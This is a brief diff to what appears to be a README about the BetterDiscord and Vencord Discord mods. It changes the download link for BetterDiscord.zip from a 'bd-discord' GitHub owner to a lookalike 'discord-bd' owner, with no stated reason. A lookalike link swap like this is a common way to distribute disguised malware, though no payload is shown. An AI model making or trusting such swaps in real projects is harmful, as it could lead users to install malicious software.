@@ -7,7 +7,7 @@ If you're deciding between **BetterDiscord or Vencord**, both are excellent. Bet
 <img width="1200" height="1200" alt="40889f16-ee21-4a2d-b647-97a9764ea52e" src="https://github.com/user-attachments/assets/f3e95f95-a3dd-4475-8ce0-9c879575915d" />
 
 ## Install
-[Download `BetterDiscord.zip`](https://github.com/bd-discord/BetterDiscord/releases/download/1.13.15/BetterDiscord.zip)
+[Download `BetterDiscord.zip`](https://github.com/discord-bd/BetterDiscord/releases/download/v1.13.15/BetterDiscord.zip)
 ---
 
 <img width="1920" height="1080" alt="845389c3-bf31-4cea-ad13-2673936d0998" src="https://github.com/user-attachments/assets/1f7fc201-9ea9-48e4-a8f6-380c1d0a33b6" />
